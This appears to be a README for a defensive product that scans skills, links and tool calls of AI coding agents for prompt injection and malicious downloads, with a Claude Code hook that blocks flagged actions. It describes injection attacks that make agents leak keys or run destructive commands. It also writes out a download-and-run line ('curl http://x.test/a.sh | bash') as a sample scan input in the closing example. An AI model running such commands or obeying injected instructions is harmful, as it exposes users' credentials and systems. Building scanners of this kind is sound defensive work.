<div align="center">

<h1>SecureAI</h1>

**An antivirus — a VirusTotal — for AI agents.** SecureAI inspects the skills, tools, and links an AI coding agent is about to trust, returns an **ALLOW / REVIEW / BLOCK** verdict in milliseconds, blocks dangerous actions inline and fail-closed, and seals every decision in a tamper-evident cryptographic proof anyone can re-verify.

[![live](https://img.shields.io/badge/live-secureai.zurielst.com-22C55E?style=flat-square)](https://secureai.zurielst.com)
[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?style=flat-square&logo=cloudflare&logoColor=white)](https://workers.cloudflare.com/)
[![Workers AI](https://img.shields.io/badge/Workers-AI-F38020?style=flat-square&logo=cloudflare&logoColor=white)](https://developers.cloudflare.com/workers-ai/)
[![Stripe](https://img.shields.io/badge/Stripe-billing-635BFF?style=flat-square&logo=stripe&logoColor=white)](https://stripe.com/)

*Don't trust the guard — verify it.*

</div>

---

> **Live at [secureai.zurielst.com](https://secureai.zurielst.com)** — paste a skill or link and watch it get scanned (redirect cascade → SSRF guard → structural rules → known-bad indicators → AI injection check), then tamper the cryptographic proof in your own browser and watch the chain break.

---

## ⚠️ The problem

AI coding agents (Claude Code, Cursor, Copilot, Codex, MCP servers) now read web pages, install third-party "skills," call tools, and run shell commands on their own — and they trust whatever they ingest. Two things go wrong:

1. **The skills and links they trust can be poisoned.** A skill or page can show a friendly-looking link whose redirects cascade to a malicious payload, or hide a `curl … | bash`, or carry a **prompt injection** that hijacks the agent. Prompt injection is the #1 risk in the OWASP Top 10 for LLM applications.
2. **The actions they take can be hijacked.** Hidden instructions in untrusted content can turn the agent against its own user — leaking API keys, exfiltrating source, or running destructive commands with the user's own credentials.

There is no antivirus for this. SecureAI is that layer, and it makes every decision **provable** instead of asking you to trust a vendor.

---

## 🔗 Two surfaces, one engine

| | **Scanner** | **Guard** |
|---|---|---|
| Where | Supply chain — before an agent trusts a skill/tool/link | Runtime — every tool call the agent makes |
| Form | Hosted web app + API (`/api/scan`, `/api/verify`) | A Claude Code **PreToolUse hook** you install in one line |
| Action | Returns a verdict + a re-verifiable proof | Blocks non-ALLOW actions **inline, fail-closed** |

Both run the same engine and produce the same artifact: a **SHA-256 hash-chained proof** that lets anyone confirm the guard was correct.

---

## ⚡ Built for the edge — low latency by design

The whole product runs on Cloudflare's edge, and the pipeline is ordered so the common path is the cheap path:

- **Deterministic-first, AI-last-and-paid-only.** Most scans never touch a model — link tracing, structural rules, and indicator lookups settle the verdict in the cheap layers, so the typical request stays sub-millisecond-ish at the worker.
- **Verdict cache.** Each scan is keyed by a content hash; an identical scan within a short TTL returns the cached result from KV in **O(1)** — no redirect re-trace, no AI call. The window is tunable via `SCANNER_VERDICT_CACHE_TTL_S` (default 300s; `0` disables it). Auth, caps, metering, and history still run for every caller, so a cache hit never skips accounting.
- **O(1) hot paths.** Indicator lookups are hash-set/indexed, not list scans; the proof chain appends against a tail pointer.

---

## 🔬 How a scan works

Cheapest and most certain checks first; the AI model is last and rarest (and paid-only):

1. **Parse** the content for links and download-and-run patterns (e.g. `curl … | bash`).
2. **Trace redirects** hop by hop behind an **SSRF guard** that rejects private, loopback, link-local, and cloud-metadata (`169.254.169.254`) hosts — re-checked on every hop, so the scanner can never be turned against your internal network.
3. **Deterministic structural rules** — raw-IP hosts, punycode / look-alike domains, URL shorteners, cross-origin redirect hops, excessive chains, embedded execution.
4. **Known-bad indicator match** — final hosts checked against a commercially-clean denylist (extensible at runtime via KV; a paid URL-reputation feed plugs into the same interface).
5. **AI injection detection** — a small open-weight model on **Cloudflare Workers AI** reads the text for prompt-injection and unsafe instructions. It is **tighten-only** (can raise caution, never lower a deterministic BLOCK), **fail-closed**, runs **only when earlier layers are ambiguous**, and is reserved for the **Pro tier**.
6. **Seal** every step into the proof chain and return the verdict.

---

## 🔐 Verifiable enforcement — the moat

Security tools ask you to trust their dashboard. SecureAI gives you a cryptographic proof you can re-check yourself:

- Each decision is recorded as a **SHA-256 hash-chained** entry — every step links to the one before it.
- A public **`/api/verify`** endpoint (and an in-browser verifier) returns **`CHAIN_OK`** or **`CHAIN_BROKEN`** with the index of the first tampered link.
- Tamper with any step — the chain breaks at exactly that point. No server round-trip required.

Two invariants hold everywhere: **fail closed** (anything that can't be judged safely is blocked) and **the model can only tighten** (it never overturns a deterministic block).

---

## 👤 Accounts, dashboard, and billing

- **Free** — link-tracing + structural rules + known-bad indicators + proof, capped daily, no AI. Costs effectively nothing to serve.
- **Pro — S$9.90/mo** (Stripe) — adds AI injection detection, private scans, a higher quota, history, and the dashboard.
- **Enterprise** — SSO, self-host, custom policies, SLA (contact).

**Sign up with email + password.** Sessions are carried in an **HMAC-signed cookie**; your **API key** is stored only as a SHA-256 hash (and is **rotatable** from the dashboard). Daily caps are enforced per tier. A pricing page lays out Free / Pro / Enterprise, and the whole UI is mobile-responsive.

**Email verification at login.** When enabled, login is a two-step flow: password first, then a one-time **6-digit code emailed via Resend**. A new account sends **no code at signup**. It is verified by completing that emailed-code login, and stays unusable (no session, no working API key) until it does. Gated on the `RESEND_API_KEY` secret; with it unset, login stays single-step and accounts are usable immediately.

**Your dashboard** shows real protection stats: **scans run**, **threats blocked**, **malicious IOCs/URLs caught**, the verdict breakdown (Allow / Review / Block), and a 30-day trend — plus your **last 3 scans** and a copy-able **API key** (used for programmatic scans and the Guard). Upgrade to Pro or open the Stripe billing portal inline.

### Admin analytics + role-based access

Accounts whose email is in `SCANNER_ADMIN_EMAILS` unlock an **admin analytics dashboard**: sitewide signups, tier mix, and usage, plus a **members directory**. Access is **role-based** — `owner` / `admin` / `member` — with promote/demote and **member removal**. This is the safety layer's own control plane: who can see the data, and who can change roles, is itself governed.

---

## 🛡️ The Guard (Claude Code)

A zero-dependency **PreToolUse hook** (see [`integrations/claude-code/`](integrations/claude-code/)). Drop one config file into `~/.claude/settings.json`, point it at your account, and every tool call is routed through SecureAI **before it runs**. A known-bad destination or an injection payload returns a real `deny`; if the API is unreachable, the action is **denied, not allowed** (fail-closed). Cursor (`beforeShellExecution` / `beforeMCPExecution`) is the documented fast-follow.

---

## 🛰️ API

One Worker, one origin, all under `/api/*`:

| Area | Endpoints |
|---|---|
| Scan & proof | `POST /api/scan`, `POST /api/verify`, `POST /api/guard` |
| Accounts | `POST /api/register`, `POST /api/login`, `POST /api/logout`, `GET /api/me`, `POST /api/key/rotate` |
| Login 2FA | `POST /api/login/verify`, `POST /api/login/resend` |
| Billing (Stripe) | `POST /api/checkout`, `POST /api/webhook`, `POST /api/portal` |
| Dashboard | `GET /api/stats`, `GET /api/scans/recent` |
| Admin (gated) | `GET /api/admin/overview`, `GET /api/admin/members`, `POST /api/admin/members/role`, `POST /api/admin/members/remove` |

`/api/scan` and `/api/guard` accept either a session cookie or an `Authorization: Bearer <api-key>` header. Anything that can't be judged safely fails closed.

---

## 🧰 Tech stack

Built entirely on Cloudflare's serverless platform — **no OpenAI, no Exa**:

- **TypeScript on Cloudflare Workers** — one Worker serves the SPA (Static Assets) and the API on one origin.
- **Workers AI** — a small open-weight model for injection detection (no per-request key; gated to Pro and to remaining budget).
- **D1** (edge SQLite) — accounts, roles, API keys, usage/verdict metering, billing, scan history, and the proof rows. **KV** — hot indicator cache and the short-TTL verdict cache.
- **Stripe** — Checkout, idempotent webhooks, customer portal (Pro at S$9.90/mo).
- **Resend** — the one-time 6-digit codes for email 2FA at login (gated on `RESEND_API_KEY`).
- **Web Crypto (`crypto.subtle`)** — the SHA-256 proof chain, PBKDF2 password hashing, HMAC-signed session cookies, and SHA-256-hashed API keys, the proof re-verifiable client-side.
- **React 19 + Vite + Tailwind v4 + recharts** — the dark/glass SPA, scanner UI, pricing, and dashboard.

The Worker + API live in [`secureai/`](secureai/); the React app in [`scanner/`](scanner/). A Python 3.12 / FastAPI transparent-proxy runtime is retained in the repo as a parked enterprise / self-host option.

---

## 🚀 Run it locally

Node 22 is recommended (newer Node can break wrangler).

```bash
# API + Worker (also serves the built SPA)
cd secureai
npm install
cp .dev.vars.example .dev.vars     # local secrets (Stripe, SESSION_SECRET); never committed
npx wrangler dev                   # local Worker with D1 + AI bindings

# Frontend (built once, served by the Worker via Static Assets)
cd ../scanner && npm install && npm run build

# Tests (Vitest)
cd ../secureai && npm test          # Worker/API suite
cd ../scanner  && npm test          # frontend suite
```

Deploy (Cloudflare account required): create the D1 + KV bindings, apply migrations, set secrets, then ship:

```bash
cd secureai
wrangler d1 create secureai && wrangler kv namespace create SECUREAI   # paste ids into wrangler.jsonc
wrangler d1 migrations apply secureai        # accounts, billing, auth/stats, 2FA, roles, scan history
wrangler secret put SESSION_SECRET           # signs session cookies (without it, only Bearer API-key auth works)
wrangler secret put STRIPE_SECRET_KEY        # + STRIPE_WEBHOOK_SECRET for billing
wrangler secret put RESEND_API_KEY           # optional — enables email 2FA at login
npm run deploy                               # builds the SPA + deploys the Worker
```

Non-secret tunables (caps, thresholds, model, verdict-cache TTL, admin allowlist, Stripe price id) live in `wrangler.jsonc` vars and are read through a typed `Env`.

---

## ✅ Verify the proof yourself

The whole thesis in two commands against the live site:

```bash
# scan something, then re-verify its proof  ->  CHAIN_OK
curl -s -X POST https://secureai.zurielst.com/api/scan \
  -H 'content-type: application/json' -d '{"content":"curl http://x.test/a.sh | bash"}' \
| python3 -c "import sys,json;print(json.dumps({'proof':json.load(sys.stdin)['proof']}))" \
| curl -s -X POST https://secureai.zurielst.com/api/verify -H 'content-type: application/json' -d @-

# tamper one byte of the proof  ->  CHAIN_BROKEN at the first invalid link
```

<div align="center">
  <br />
  <i>don't trust the guard, verify it.</i>
</div>
